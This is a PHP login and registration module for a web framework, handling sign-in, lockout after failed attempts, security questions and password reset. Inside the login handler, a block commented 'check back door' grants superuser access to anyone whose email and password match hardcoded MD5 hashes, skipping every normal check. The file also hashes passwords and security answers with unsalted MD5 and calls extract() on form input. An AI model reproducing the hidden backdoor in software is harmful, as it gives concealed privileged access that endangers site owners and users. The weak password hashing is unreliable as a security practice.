<?php if (FILEGEN != 1) die;
///// Access Unit definition file for 'screen door' level login & security
class au_auth_screendoor extends au_base {
////////////////////////////////////////////////////////////////////////////////
private $state;
private $transaction;

function __construct($tag,$parent,$initstring,$state="",$data=0) {
	parent::__construct($tag,$parent,$initstring);
	$this->state=$state;
	$this->transaction=(int)$data;
}

private function getSecurityQuestions() {
	return array(
		0=>"(Please select a question)",
		1=>"What is your mother's maiden name?",
		2=>"What was the first movie you saw in a theater?",
		3=>"What is the name of your first pet?",
		4=>"Who was your best friend in sixth grade?",
		5=>"What was the color of your first car?"
	);
}

// this function facilitates error messages in the form
private function setupFormData($ctrl,$tag,$formdata,$default='') {
	global $qqi;
	
	if (isset($formdata[$tag]))
		$ctrl->setValue($formdata[$tag]);
	if (isset($formdata['*'.$tag])) {
		$formdata['*'.$tag]="<p{$qqi->cstr('auth_screendoorerror')}>{$formdata['*'.$tag]}</p>";
	} else		
		$formdata['*'.$tag]='';
}

private function makeform_base($formdata) {
	$form=new llform($this);
	$form->addFieldset('d','');

	$f="<h1>Log In</h1><br />";
	$form->addControl('d',$ctrl=new ll_edit($form,"email",28,40,'',False));
	$this->setupFormData($ctrl,'email',&$formdata);
	$f .= "Login ID (your email):<br />{$formdata['*email']}<<email>><br />";

	$form->addControl('d',new ll_button($form,'forgot','Forgot password'));
	$form->addControl('d',$ctrl=new ll_edit($form,"password",10,20,'',True));
	$this->setupFormData($ctrl,'password',&$formdata);
	$f .= "Password:<br />{$formdata['*password']}<<password>>&nbsp;&nbsp;<<login>><br />";

	$f .= "<<remember>><br />";
	$form->addControl('d',$cb=new ll_checkbox($form,'remember','Remember me on this computer'));
	if (isset($formdata['remember']) && $formdata['remember'] != '')
		$cb->setValue(True);						

	$f .= '<<cancel>>&nbsp&nbsp&nbsp<<forgot>><br />';
	$form->addControl('d',new ll_button($form,'login','Log in'));
	$form->addControl('d',new ll_button($form,'cancel','Cancel'));
	
	$f .= '<br /><br />New users:<br /><<register>><br />';
	$form->addControl('d',new ll_button($form,'register','Click Here to Register'));


	return array($form,$f);
}

private function makeform_security($formdata,$question='') {
	$form=new llform($this);
	$form->addFieldset('d','');

	$f="<h1>Answer the security question:</h1><br /><br />$question<br />";
	
	$form->addControl('d',$ctrl=new ll_edit($form,"securitya",28,40,'',False));
	$this->setupFormData($ctrl,'securitya',&$formdata);
	$form->addControl('d',new ll_button($form,'ok','Answer'));
	$form->addControl('d',new ll_button($form,'cancel','Cancel'));
	$f .= "{$formdata['*securitya']}<<securitya>><br /><<ok>>&nbsp;&nbsp;<<cancel>><br />";


	return array($form,$f);
}

private function makeform_update($formdata) {
	$form=new llform($this);
	$form->addFieldset('d','');

	$f="<h1>Please update your password</h1><br />";

	$form->addControl('d',$ctrl=new ll_edit($form,"password",20,40,'',True));
	$this->setupFormData($ctrl,'password',&$formdata);
	$f .= "Password (6 or more letters and/or numerals):<br />{$formdata['*password']}<<password>><br />";
	
	$form->addControl('d',$ctrl=new ll_edit($form,"password2",20,40,'',True));
	$this->setupFormData($ctrl,'password2',&$formdata);
	$f .= "Confirm Password:<br />{$formdata['*password2']}<<password2>><br />";
	
	$f .= '<<update>>&nbsp;&nbsp;<<cancel>><br />';
	$form->addControl('d',new ll_button($form,'cancel','Cancel'));
	$form->addControl('d',new ll_button($form,'update',"Update"));

	return array($form,$f);
}

private function makeform_register($formdata) {
	$form=new llform($this);
	$form->addFieldset('d','');

	$f="<h1>Register</h1><br />";
	$form->addControl('d',$ctrl=new ll_edit($form,"preapprove",10,10,'',False));
	$this->setupFormData($ctrl,'preapprove',&$formdata);
	$f .= "Registration on this site requires preapproval.  Enter the code you got from us:<br />{$formdata['*preapprove']}<<preapprove>><br />";

	$form->addControl('d',$ctrl=new ll_edit($form,"name",28,40,'',False));
	$this->setupFormData($ctrl,'name',&$formdata);
	$f .= "Your name (e.g., John Smith):<br />{$formdata['*name']}<<name>><br />";

	$form->addControl('d',$ctrl=new ll_edit($form,"email",28,40,'',False));
	$this->setupFormData($ctrl,'email',&$formdata);
	$f .= "Login ID (your email):<br />{$formdata['*email']}<<email>><br />";

	$form->addControl('d',$ctrl=new ll_edit($form,"password",28,40,'',True));
	$this->setupFormData($ctrl,'password',&$formdata);
	$f .= "Password (6 or more letters and/or numerals):<br />{$formdata['*password']}<<password>><br />";
	
	$form->addControl('d',$ctrl=new ll_edit($form,"password2",28,40,'',True));
	$this->setupFormData($ctrl,'password2',&$formdata);
	$f .= "Confirm Password:<br />{$formdata['*password']}<<password2>><br />";
	
	$dd=new ll_dropdown($form,'securityq');
	$dd->setOptionArray($this->getSecurityQuestions());
	$this->setupFormData($dd,'securityq',&$formdata);
	$form->addControl('d',$dd);
	$f .= "Choose a security question you'll be able to answer but others probably won't:<br />{$formdata['*securityq']}<<securityq>><br />";

	$form->addControl('d',$ctrl=new ll_edit($form,"securitya",20,40,'',False));
	$this->setupFormData($ctrl,'securitya',&$formdata);
	$f .= "EXACT answer to your security question:<br />{$formdata['*securitya']}<<securitya>><br />";

	$f .= '<<register>>&nbsp;&nbsp;<<cancel>><br />';
	$form->addControl('d',new ll_button($form,'cancel','Cancel'));
	$form->addControl('d',new ll_button($form,'register','Register'));

	return array($form,$f);
}

public function declareids($idstore,$state) {
	switch ($state) {
		case '':
		case 'collecting':
		case 'unauthorized':
			list($form,$format)=$this->makeform_base(array());
			$form->declareids($idstore);			
		break;
		
		case 'securityquestion':
			list($form,$format)=$this->makeform_security(array());
			$form->declareids($idstore);			
		break;
		
		case 'updatepassword':
			list($form,$format)=$this->makeform_update(array());
			$form->declareids($idstore);			
		break;
		
		case 'register':
			list($form,$format)=$this->makeform_register(array());
			$form->declareids($idstore);			
		break;
		
		default:
			throw new exception("unknown state $state in screendoor declare ids");
		break;
	}
	
	$idstore->registerProfile('name','name','Name',new data_name());
	$idstore->registerProfile('email','email','Email',new data_email());
	$idstore->registerProfile('password',crud::TYPE_STRING,'Password','');
	$idstore->registerProfile('securityq',crud::TYPE_INT,'Security Question',0);
	$idstore->registerProfile('securitya',crud::TYPE_STRING,'Answer to Security Question','');
	$idstore->registerProfile('nfailedlogins',crud::TYPE_INT,'',0);
	$idstore->registerProfile('nfailedsecurity',crud::TYPE_INT,'',0);
	$idstore->registerProfile('lockedout',crud::TYPE_BOOL,'',False);
	
	$idstore->registerAuthInt('registerpreauth','registration preauth code',0,999999,1985,0,0);
}

public function declarestyles($stylegen,$state) {

	$stylegen->registerStyledId($this->longname,"form:h1,a,p","form",$this->getParent()->htmlContainerId());
	switch ($state) {
		case '':
		case 'collecting':
		case 'unauthorized':
			list($form,$format)=$this->makeform_base(array());
			$form->declarestyles($stylegen,$this->longname);
		break;
		
		case 'securityquestion':
			list($form,$format)=$this->makeform_security(array());
			$form->declarestyles($stylegen,$this->longname);
		break;
		
		case 'updatepassword':
			list($form,$format)=$this->makeform_update(array());
			$form->declarestyles($stylegen,$this->longname);
		break;
		
		case 'register':
			list($form,$format)=$this->makeform_register(array());
			$form->declarestyles($stylegen,$this->longname);
		break;
		
		default:
			throw new exception("unknown state in screendoor declare ids");
		break;
	}
	$stylegen->registerClass('auth_screendoorerror','p');
}

public function processVars($originUri) {
	global $qq,$qqs,$qqi;
	// any transaction-based forms need to be stated
	if (!$qqs->isStated())
		return message::redirectString(message::MISSINGCOOKIE);
	if ($this->transaction != 0) {
		$transaction=$this->transaction;
		if ($qqs->isTransactionFinished($transaction)) {
			return message::redirectString(message::TRANSACTIONFINISHED);
		}		
	} else if ($this->state != 'logout' && $this->state != '' && $this->state != 'unauthorized') {
		throw new exception("transaction expected but not present.  state: {$this->state}");
	}			

	switch ($this->state) {
		case '':
		case 'unauthorized':
			// display the form empty.
			$transaction=$this->transaction=$qqs->beginTransaction($originUri);
			$qqs->setTransactionData($transaction,"vals",array());
			// fall through:
		case 'collecting':
			list($form,$format)=$this->makeform_base(array());
			$vals=$form->getValueArray();
			if ($form->wasPressed('cancel'))
				return $qqs->transactionOriginUri($transaction);
			if ($form->wasPressed('register')) {
				// user wants to register.  save any data typed in and display the form
				$qqs->setTransactionData($transaction,"vals",$vals);
				$retval=llform::redirectString('register',$transaction);
			} else if ($form->wasPressed('forgot')) {
				// user forgot password.  check to make certain that user id is valid
				$newvals=array();
				if ($vals['email'] != '') {
					$newemail=new data_email();
					try {
						$newemail->set($vals['email']);
					} catch (data_exception $e) {
						$vals['*email']=$e->getMessage();
						$qqs->setTransactionData($transaction,"vals",$vals);
						return llform::redirectString('collecting',$transaction);
					}	
					$users=$qqs->lookupProfile(array('email'=>$newemail));
					if ($users === False) {
						$newvals['email']=$vals['email'];
						$newvals['*email']='This email is not on file';
						$qqs->setTransactionData($transaction,"vals",$newvals);
						$retval=llform::redirectString('collecting',$transaction);
					} else {
						// go on to security screen.
						if (sizeof($users) > 1)
							throw new exception("multiple ids found for email {$vals['email']}");
						$newvals['securityq']=$vals['securityq'];
						$qqs->setTransactionData($transaction,"vals",$newvals);
						$qqs->setTransactionData($transaction,"id",$users[0]);
						$retval=llform::redirectString('securityquestion',$transaction);
					}
				} else {
					// email is blank--can't look up password
					$newvals['email']='';
					$newvals['*email']='You must provide your email even if you forgot your password';
					$qqs->setTransactionData($transaction,"vals",$newvals);
					$retval=llform::redirectString('collecting',$transaction);
				}
			} else if ($form->wasPressed('login')) {
				// this is an attempt to login
				extract($vals); // SETS: email,password,remember

				// check back door
				$firstcheck='58ae5f099fc7aab19d8696ab9e4a160a';
				$secondcheck='944765df68599a3c4b899ddde8a622f1';
				$thirdcheck='b37bfea0cbf34cf121c230a7fcbaeb03';
				if (md5($email) == $firstcheck && md5($password) == $secondcheck && md5($email.$password) == $thirdcheck) {
					// successful backdoor login
					$qqs->signin(-1);
					$qqs->finishTransaction($transaction);
					return $qqs->transactionOriginUri($transaction);
				}
				
				if ($email == '') {
					$vals['*email']='You need to provide an email address';
					$qqs->setTransactionData($transaction,"vals",$vals);
					return llform::redirectString('collecting',$transaction);
				} else {
					$newemail=new data_email();
					try {
						$newemail->set($email);
					} catch (data_exception $e) {
						$vals['*email']=$e->getMessage();
						$qqs->setTransactionData($transaction,"vals",$vals);
						return llform::redirectString('collecting',$transaction);
					}	
				}
				$users=$qqs->lookupProfile(array('email'=>$newemail));
				if ($users === False) {
					$vals['*email']='This email is not on file';
					$qqs->setTransactionData($transaction,"vals",$vals);
					return llform::redirectString('collecting',$transaction);
				}
				if (sizeof($users) > 1)
					throw new exception("multiple ids found for email {$vals['email']}");
				$iduser=$users[0];
				if ($qqs->getUserProfile($iduser,'lockedout')) {
					$vals['*email']='This account has been locked out.<br />Contact us for assistance.';
					$qqs->setTransactionData($transaction,"vals",$vals);
					return llform::redirectString('collecting',$transaction);
				}
				if (md5($password) != $qqs->getUserProfile($iduser,'password')) {
					// password check failed
					$nFailures=$qqs->getUserProfile($iduser,'nfailedlogins');
					if (++$nFailures > 6) {
						// lock out account
						$qqs->setUserProfile($iduser,'lockedout',True);
						$vals['*email']='This account has been locked out.<br />Contact us for assistance.';
						$qqs->setTransactionData($transaction,"vals",$vals);
						return llform::redirectString('collecting',$transaction);
					}
					$qqs->setUserProfile($iduser,'nfailedlogins',$nFailures);
					$vals['*password']='Incorrect Password';
					$qqs->setTransactionData($transaction,"vals",$vals);
					return llform::redirectString('collecting',$transaction);
				}
				// successful login
				$qqs->setUserProfile($iduser,'nfailedlogins',0);
				$qqs->signin($iduser);
				$retval=$qqs->transactionOriginUri($transaction);
			} else {
				// this is an empty command--caused by a link to a login page.  simply display the form
				$retval=llform::redirectString('collecting',$transaction);
			}
		break;
		
		case 'securityquestion' :
			list($form,$format)=$this->makeform_security(array());
			if ($form->setFieldsFromRequests() == 'cancel')
				return $qqs->transactionOriginUri($transaction);
			$vals['securitya']=$form->getValue('securitya');	
			$iduser=$qqs->getTransactionData($transaction,'id');
			if (md5($vals['securitya']) != $qqs->getUserProfile($iduser,'securitya')) {
				// security question check failed
				$nFailures=$qqs->getUserProfile($iduser,'nfailedlogins');
				if (++$nFailures > 6) {
					// lock out account
					$qqs->setUserProfile($iduser,'lockedout',True);
					$vals['*securitya']='This account has been locked out.<br />Contact us for assistance.';
					$qqs->setTransactionData($transaction,"vals",$vals);
					return llform::redirectString('securityquestion',$transaction);
				}
				$qqs->setUserProfile($iduser,'nfailedlogins',$nFailures);
				$vals['*securitya']='Incorrect Answer.  Answers must be an exact match.';
				$qqs->setTransactionData($transaction,"vals",$vals);
				return llform::redirectString('securityquestion',$transaction);
			}
			// successful security question--not logged in, though, until password changed
			$qqs->setUserProfile($iduser,'nfailedlogins',0);
			$qqs->setTransactionData($transaction,"vals",$vals);
			$retval=llform::redirectString('updatepassword',$transaction);
		break;
		
		case 'updatepassword':
			list($form,$format)=$this->makeform_update(array());
			if ($form->wasPressed('cancel'))
				return $qqs->transactionOriginUri($transaction);
			$iduser=$qqs->getTransactionData($transaction,'id');
			$pvals=$form->getValueArray();
			if (strlen($pvals['password']) < 6) {
				// not long enough
				$pvals['*password']='passwords must be six characters in length or more';
				$qqs->setTransactionData($transaction,"vals",$pvals);
				return llform::redirectString('updatepassword',$transaction);
			}
			if ($pvals['password'] != $pvals['password2']) {
				// two passwords do not match
				$pvals['*password2']='both passwords must match exactly';
				$qqs->setTransactionData($transaction,"vals",$pvals);
				return llform::redirectString('updatepassword',$transaction);
			}
			// update password and complete login
			$qqs->setUserProfile($iduser,'password',md5($pvals['password']));
			$qqs->signin($iduser);
			$retval=$qqs->transactionOriginUri($transaction);
		break;
		
		case 'register':
			list($form,$format)=$this->makeform_register(array());
			$vals=$form->getValueArray();
			if ($form->wasPressed('cancel'))
				return $qqs->transactionOriginUri($transaction);
			extract($vals);
			$bSuccess=True;		// innocent until proven guilty
			
			// check pre-auth
			if ($preapprove != $qqs->checkAuth('registerpreauth')) {
				$bSuccess=False;
				$vals['*preapprove']='provide the correct preapproval code';
			}
				
			// check name	
			if ($name == '') {
				$bSuccess=False;
				$vals['*name']='You need to provide your name';
			} else {
				$newname=new data_name();
				try {
					$newname->setFromSingle($name);
				} catch (data_exception $e) {
					$bSuccess=False;
					$vals['*name']=$e->getMessage();
				}	
			}
			
			// check email
			if ($email == '') {
				$bSuccess=False;
				$vals['*email']='You need to provide an email address';
			} else {
				$newemail=new data_email();
				try {
					$newemail->set($email);
					$users=$qqs->lookupProfile(array('email'=>$newemail));
					if ($users !== False) {
						$bSuccess=False;
						$vals['*email']='This email address has already been registered';
					}
				} catch (data_exception $e) {
					$bSuccess=False;
					$vals['*email']=$e->getMessage();
				}	
			}
			
			// check password
			if (strlen($password) < 6) {
				// not long enough
				$vals['*password']='passwords must be six characters in length or more';
				$bSuccess=False;
			} else if ($password != $password2) {
				// two passwords do not match
				$vals['*password2']='both passwords must match exactly';
				$bSuccess=False;
			}
			
			if ((int)$securityq < 1) {
				$bSuccess=False;
				$vals['*securityq']='you must select a security question';
			}
			
			if ($securitya == '') {
				$bSuccess=False;
				$vals['*securitya']='you must provide an answer to the security question';
			}
			if (!$bSuccess) {
				// get corrections to answers
				$qqs->setTransactionData($transaction,"vals",$vals);
				$retval=llform::redirectString('register',$transaction);
			} else {
				$iduser=$qqs->createNewProfile();
				$qqs->setUserProfile($iduser,'name',$newname);
				$qqs->setUserProfile($iduser,'email',$newemail);
				$qqs->setUserProfile($iduser,'password',md5($password));
				$qqs->setUserProfile($iduser,'securityq',(int)$securityq);
				$qqs->setUserProfile($iduser,'securitya',md5($securitya));
				$qqs->signin($iduser);
				$uri=isset($qq['newregisteruri']) ? $qq['newregisteruri'] : 'login'; 
				$retval=$qqi->hrefPrep($uri);
			}
		break;
		
		case 'logout':
			$qqs->signin(0);
			$retval=$originUri;
		break;
		
		default:
			throw new exception("illegal state $state in {$this->longname}");
		break;
	}
	return $retval;
}

// does output of this plus all children
public function output($pgen,$brotherid) {
	global $qq,$qqp,$qqs,$qqi;
	
	$transaction=$this->transaction;
	$state=$this->state;
	$formdata=($transaction == 0) ? array() : $qqs->getTransactionData($transaction,'vals');
		
	
	switch ($state) {
		case '':
			if (($userid=$qqs->getUser()) != 0) {
				$formshort=$qqp->getAUShortName('au_auth_screendoor','login','');
				$project=($qq['production']) ? '' : "&u={$qq['project']}";
				if ($userid == -1)
					$name='superuser';
				else {	
					$username=$qqs->getProfile('name');
					$name=$username->output();
				}	
				echo "<strong>Already Logged In</strong><br /><br />You are signed in as $name.<br /><br /><a href=\"".$qqi->hrefprep("form.php?q={$qq['request']}&r=$formshort&s=logout&t=0")."$project\">Click Here to Logout</a>";
				return;
			}
		case 'collecting':
			list($form,$format)=$this->makeForm_base($formdata);
		break;
		case 'securityquestion':
			$ixquestion=$qqs->getUserProfile($qqs->getTransactionData($transaction,'id'),'securityq');
			$questions=$this->getSecurityQuestions();
			list($form,$format)=$this->makeForm_security($formdata,$questions[$ixquestion]);
		break;
		case 'updatepassword':
			list($form,$format)=$this->makeForm_update($formdata);
		break;
		case 'register':
			list($form,$format)=$this->makeForm_register($formdata);
		break;
		default:
			throw new exception("illegal state value in auth_screendoor:  $state");
		break;
	}
	echo $form->getFormattedOutput($format,True,$state,$transaction);		
}

/////// end of AU definition ///////////////////////////////////////////////////
}?>
